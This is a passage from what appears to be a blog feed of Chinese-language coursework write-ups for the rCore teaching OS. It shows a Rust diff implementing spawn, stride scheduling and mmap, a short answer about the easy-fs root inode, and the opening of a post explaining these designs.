class="token line">    let _path = translated_str(token, _path);</span><span class="token prefix inserted">+</span><span class="token line">    let data_opt = open_file(&amp;_path, OpenFlags::RDONLY);</span><span class="token prefix inserted">+</span><span class="token line">    if data_opt.is_none() &#123;  // invalid file name</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    let new_task = current_task.spawn(data_opt.unwrap().read_all().as_slice());</span><span class="token prefix inserted">+</span><span class="token line">    let new_pid = new_task.getpid();</span><span class="token prefix inserted">+</span><span class="token line">    add_task(new_task);</span><span class="token prefix inserted">+</span><span class="token line">    new_pid as isize</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// YOUR JOB: Set task priority.</span><span class="token prefix unchanged"> </span><span class="token line">pub fn sys_set_priority(_prio: isize) -> isize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">    trace!(</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority NOT IMPLEMENTED",</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        "kernel:pid[&#123;&#125;] sys_set_priority",</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        current_task().unwrap().pid.0</span><span class="token prefix unchanged"> </span><span class="token line">    );</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    -1</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if _prio &lt;= 1 &#123;</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    let current_task = current_task().unwrap();</span><span class="token prefix inserted">+</span><span class="token line">    current_task.set_prio(_prio);</span><span class="token prefix inserted">+</span><span class="token line">    _prio</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/os/src/task/manager.rs b/os/src/task/manager.rsindex 99393a4..b0f2b52 100644<span class="token coord">--- a/os/src/task/manager.rs</span><span class="token coord">+++ b/os/src/task/manager.rs</span>@@ -19,11 +19,27 @@ impl TaskManager &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Add process back to ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn add(&amp;mut self, task: Arc&lt;TaskControlBlock>) &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        task.inc_stride();</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        self.ready_queue.push_back(task);</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    /// Take a process out of the ready queue</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn fetch(&amp;mut self) -> Option&lt;Arc&lt;TaskControlBlock>> &#123;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">        self.ready_queue.pop_front()</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">        // self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        let mut min_stride = isize::MAX;</span><span class="token prefix inserted">+</span><span class="token line">        let mut best_idx = 0;</span><span class="token prefix inserted">+</span><span class="token line">        for (idx, tcb) in self.ready_queue.iter().enumerate() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            let stride = tcb.get_stride();</span><span class="token prefix inserted">+</span><span class="token line">            if min_stride > stride &#123;</span><span class="token prefix inserted">+</span><span class="token line">                min_stride = stride;</span><span class="token prefix inserted">+</span><span class="token line">                best_idx = idx;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        if min_stride == isize::MAX &#123;</span><span class="token prefix inserted">+</span><span class="token line">            None</span><span class="token prefix inserted">+</span><span class="token line">        &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.swap(0, best_idx);</span><span class="token prefix inserted">+</span><span class="token line">            self.ready_queue.pop_front()</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/os/src/task/processor.rs b/os/src/task/processor.rsindex f05fa09..14b8ae0 100644<span class="token coord">--- a/os/src/task/processor.rs</span><span class="token coord">+++ b/os/src/task/processor.rs</span>@@ -8,6 +8,7 @@ use super::__switch;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;fetch_task, TaskStatus&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;TaskContext, TaskControlBlock&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::TrapContext;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::Arc;</span><span class="token prefix unchanged"> </span><span class="token line">use lazy_static::*;</span></span>@@ -61,6 +62,11 @@ pub fn run_tasks() &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            let mut task_inner = task.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">            let next_task_cx_ptr = &amp;task_inner.task_cx as *const TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">            task_inner.task_status = TaskStatus::Running;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">            // if the task is being called for the first time,</span><span class="token prefix inserted">+</span><span class="token line">            if task_inner.time == 0usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">                // then set it to the current time</span><span class="token prefix inserted">+</span><span class="token line">                task_inner.time = get_time_ms();</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            // release coming task_inner manually</span><span class="token prefix unchanged"> </span><span class="token line">            drop(task_inner);</span><span class="token prefix unchanged"> </span><span class="token line">            // release coming task TCB manually</span></span>diff --git a/os/src/task/task.rs b/os/src/task/task.rsindex ff5b581..d8c5510 100644<span class="token coord">--- a/os/src/task/task.rs</span><span class="token coord">+++ b/os/src/task/task.rs</span><span class="token coord">@@ -1,10 +1,11 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! Types related to task management &amp; Functions for completely changing TCB</span><span class="token prefix unchanged"> </span><span class="token line">use super::TaskContext;</span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;kstack_alloc, pid_alloc, KernelStack, PidHandle&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::TRAP_CONTEXT_BASE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::fs::&#123;File, Stdin, Stdout&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::mm::&#123;MemorySet, PhysPageNum, VirtAddr, KERNEL_SPACE&#125;;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;BIG_STRIDE, MAX_SYSCALL_NUM, TRAP_CONTEXT_BASE&#125;;</span><span class="token prefix inserted">+</span><span class="token line">use crate::mm::&#123;MapPermission, MemorySet, PhysPageNum, VPNRange, VirtAddr, VirtPageNum, KERNEL_SPACE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::timer::get_time_ms;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::trap::&#123;trap_handler, TrapContext&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::sync::&#123;Arc, Weak&#125;;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec;</span></span>@@ -36,6 +37,86 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix unchanged"> </span><span class="token line">        inner.memory_set.token()</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// Set the schduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.set_prio(prio);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get the schduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_stride(&amp;self) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.stride</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase the stride by pass</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.inc_stride();</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_syscall_times(&amp;self) -> [u32; MAX_SYSCALL_NUM] &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times.clone()</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Get time span between current time and first scheduled time</span><span class="token prefix inserted">+</span><span class="token line">    pub fn get_scheduled_timespan(&amp;self) -> usize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        get_time_ms() - inner.time</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Increase syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_syscall_times(&amp;self, syscall_id: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">        if syscall_id >= MAX_SYSCALL_NUM &#123;</span><span class="token prefix inserted">+</span><span class="token line">            return false;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        inner.syscall_times[syscall_id] += 1;</span><span class="token prefix inserted">+</span><span class="token line">        true</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    /// Map some pages to memory_set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn mmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr, port: usize) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil()</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        </span><span class="token prefix inserted">+</span><span class="token line">        // 3. Check if trying to map mapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1;</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // push a new map_area to current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        let perm = MapPermission::from_bits((port as u8) &lt;&lt; 1).unwrap() | MapPermission::U;</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.insert_framed_area(start_va, end_va, perm);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Unmap some pages in memory set</span><span class="token prefix inserted">+</span><span class="token line">    pub fn munmap(&amp;self, start_va: VirtAddr, end_va: VirtAddr) -> isize &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut inner = self.inner.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        let vpn_range = VPNRange::new(</span><span class="token prefix inserted">+</span><span class="token line">            VirtPageNum::from(start_va),</span><span class="token prefix inserted">+</span><span class="token line">            end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlockInner &#123;</span></span>@@ -71,6 +152,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -94,6 +187,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">            self.fd_table.len() - 1</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -135,6 +235,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    ],</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -216,6 +320,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -231,6 +339,65 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        // copy fd table</span><span class="token prefix inserted">+</span><span class="token line">        let mut new_fd_table: Vec&lt;Option&lt;Arc&lt;dyn File + Send + Sync>>> = Vec::new();</span><span class="token prefix inserted">+</span><span class="token line">        for fd in parent_inner.fd_table.iter() &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(file) = fd &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(Some(file.clone()));</span><span class="token prefix inserted">+</span><span class="token line">            &#125; else &#123;</span><span class="token prefix inserted">+</span><span class="token line">                new_fd_table.push(None);</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    fd_table: new_fd_table,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p><strong>Q:</strong> 在我们的 easy-fs 中，root inode 起着什么作用？如果 root inode 中的内容损坏了，会发生什么？</p><p><strong>A:</strong> root inode 起着根目录的作用，如果 root inode 中的内容（例如文件数据链接 <code>direct</code>、<code>indirect</code> 等）损坏了，可能导致根目录下的文件无法被正常访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter5练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/02/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter5%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-02T15:30:11.000Z</published>
    <updated>2024-11-04T11:44:00.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="进程创建"><a href="#进程创建" class="headerlink" title="进程创建"></a>进程创建</h3><p>如果只是想根据特定程序来创建进程，而不需要 <code>fork + exec</code> 组合提供的灵活性（如文件重定位等），那么 <code>spawn</code> 将是一个更简洁且效率更高的选择，本实验要求便是实现它。</p><p>对于 <code>spawn</code> 的实现，确实可以简单地将 <code>fork</code> 和 <code>exec</code> 拼接起来。但需要注意的是，<code>fork</code> 首先拷贝父进程的地址空间，<code>exec</code> 再将该地址空间替换，二者融合后最开始地址空间的拷贝其实是徒劳的。如以下代码所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> memory_set <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_existed_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>parent_inner<span class="token punctuation">.</span>memory_set<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// futile code!</span><span class="token punctuation">...</span><span class="token keyword">let</span> <span class="token punctuation">(</span>memory_set<span class="token punctuation">,</span> user_sp<span class="token punctuation">,</span> entry_point<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token class-name">MemorySet</span><span class="token punctuation">::</span><span class="token function">from_elf</span><span class="token punctuation">(</span>elf_data<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="stride-调度算法"><a href="#stride-调度算法" class="headerlink" title="stride 调度算法"></a>stride 调度算法</h3><p>实现一个简单的步长调度算法，由于算法思路比较简单，这里直接介绍实现方式。</p><p>首先，为了保存进程的“步长”和优先级信息，需要为进程控制块添加两个字段 <code>stride</code> 和 <code>prio</code>（不考虑性能，为了实现的简单，<code>pass</code> 字段省略，而是在每次增加步长时再计算）。</p><p>在进行调度时（<code>TaskManager.fetch()</code>），需要从进程就绪队列中找到 stride 最小的进程进行调度，并为其 stride 加上对应的 pass，pass 的计算方式是用预先设定的大常数 BigStride 除以进程优先级 prio 得到。这里如果为了效率考虑，就绪队列可以采用优先队列的数据结构，而为了实现的简单，这里选择一次遍历的方式寻找最小值。</p><p>最后，在一个时间片后，重新调度当前 stride 最小的进程。这一时间片轮转策略已经事先实现好，不需要做修改，实现代码如下所示：</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// os/src/task/mod.rs</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">trap_handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token operator">!</span> <span class="token punctuation">&#123;</span><span class="token punctuation">...</span>        <span class="token class-name">Trap</span><span class="token punctuation">::</span><span class="token class-name">Interrupt</span><span class="token punctuation">(</span><span class="token class-name">Interrupt</span><span class="token punctuation">::</span><span class="token class-name">SupervisorTimer</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">set_next_trigger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">suspend_current_and_run_next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">...</span><span class="token punctuation">&#125;</span></code></pre><p>CPU 每个时钟周期都发起一次时钟中断进入内核，内核的 <code>trap_handler</code> 检测到陷入原因是时钟中断，则调用 